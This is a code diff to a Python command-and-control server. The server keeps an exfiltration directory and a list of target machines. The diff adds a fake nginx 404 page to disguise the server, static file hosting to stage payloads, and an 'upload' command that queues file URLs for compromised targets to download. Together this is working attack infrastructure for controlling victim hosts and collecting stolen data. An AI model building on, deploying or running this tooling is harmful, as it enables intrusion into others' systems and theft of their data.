@@ -10,6 +10,7 @@ import logging
 import json
 from io import BytesIO
 
+import validators
 import shutil
 
 import traceback
@@ -34,7 +35,10 @@ import pty
 
 
 SETTINGS = {
-"exfil_dir":"/root/exfil/"
+"exfil_dir":"/root/exfil/",
+"static_dir":"static/",
+"protocol":"https",
+"static_url":None
 }
 
 targets = []
@@ -68,12 +72,36 @@ curr_prompt = None
 
 class TrashCollector(BaseHTTPRequestHandler):
 
-    def do_GET(self):
-        self.send_response(200)
+    def do_404(self):
+        self.send_response(404)
         self.end_headers()
-        self.wfile.write(b'Hello, world!')
+        self.wfile.write(b"""
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.10.3 (Ubuntu)</center>
+</body>
+</html>
+"""
+)
 
+    def do_GET(self):
+        try:
+            path = os.path.normpath("./{}".format(self.path))
+            path = os.path.join(SETTINGS['static_dir'], path)
 
+            logging.info("\tMapping request for {} to {}".format(self.path, path))
+
+            f = open(path, 'rb')
+            self.send_response(200)
+            self.end_headers()
+            
+            shutil.copyfileobj(f, self.wfile)
+            f.close()
+        except Exception as e:
+            logging.info("{} Error serving Path: {}. {}".format(self.get_host(), path, e))
+            self.do_404()
 
     def do_upload(self):
         # Do some browsers /really/ use multipart ? maybe Opera ?
@@ -270,6 +298,15 @@ def load_module(filename):
         print("Could not read file {}".format(filename))
         print(e)
 
+def in_directory(file, directory):
+    #make both absolute    
+    directory = os.path.join(os.path.realpath(directory), '')
+    file = os.path.realpath(file)
+
+    #return true, if the common prefix of both is equal to directory
+    #e.g. /a/b/c/d.rst and directory is /a/b, the common prefix is /a/b
+    return os.path.commonprefix([file, directory]) == directory
+
 def do(cmd):
     try:
         if not cmd:
@@ -290,6 +327,47 @@ def do(cmd):
             prompt_toolkit.shortcuts.clear()
         elif c == "load_module":
             load_module(*arr[1:])
+        elif c == "upload":
+            path = arr[1]
+            bn = os.path.basename(arr[1])
+            is_url = False
+
+            try:
+                if validators.url(arr[1]):
+                    is_url = True
+            except Exception as e:
+                pass
+
+            if is_url:
+                print("Uploading remote file: {}".format(arr[1]))
+            elif bn == arr[1]:
+                # assume the file is in static_dir
+                path = os.path.join(SETTINGS['static_dir'], arr[1])
+                print("In Static {}".format(path))
+            elif not in_directory(arr[1], SETTINGS['static_dir']):
+                path = os.path.join(SETTINGS['static_dir'], bn)
+                print("Copying {} to {}".format(arr[1], path))
+                shutil.copy(arr[1], path)
+                
+            else:
+                print("In default {}".format(path))
+                path = os.path.realpath(path)
+
+            url = ""
+            if is_url:
+                url = arr[1]
+            else:
+                url_path = path[len(os.path.commonprefix([path, SETTINGS['static_dir']])):]
+                if not is_url and not os.path.exists(path):
+                    print("Error: {} does not exist - task not queued".format(path))
+                else:
+                    url = os.path.join(SETTINGS['static_url'], url_path)
+                    print("File ready at {}".format(url))
+            if target:
+                task(target, c, url)
+            else:
+                print('Set a target - try "show targets"')
+                
         elif c == "exit":
             print("Killing the server...")
             #sys.exit(1)
@@ -396,6 +474,19 @@ if __name__=="__main__":
     srv_thread = threading.Thread(target=srv, args=(ip, port))
     srv_thread.daemon = True
     srv_thread.start()
+
+    SETTINGS['static_url'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
+    static_dir = SETTINGS['static_dir']
+
+    if not os.path.isabs(static_dir):
+        static_dir = os.path.join(os.getcwd(), static_dir)
+        SETTINGS['static_dir'] = static_dir
+
+    try:
+        os.makedirs(static_dir)
+    except Exception as e:
+        pass
+    print("Static URL: {} serves {}".format(SETTINGS['static_url'], static_dir))
 
     prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 
 
